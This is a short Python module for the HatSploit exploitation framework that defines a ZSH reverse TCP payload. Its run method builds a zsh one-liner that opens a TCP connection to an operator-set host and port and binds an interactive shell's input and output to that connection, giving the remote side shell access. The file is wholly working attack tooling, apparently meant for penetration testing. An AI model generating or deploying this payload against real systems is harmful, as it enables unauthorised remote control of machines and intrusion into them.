"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, ReverseTCPHandler):
    def __init__(self):
        super().__init__({
            'Name': "ZSH shell Reverse TCP",
            'Payload': "unix/generic/zsh_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "ZSH shell reverse TCP payload.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_UNIX,
        })

    def run(self):
        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp {self.rhost.value} {self.rport.value} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
        return payload
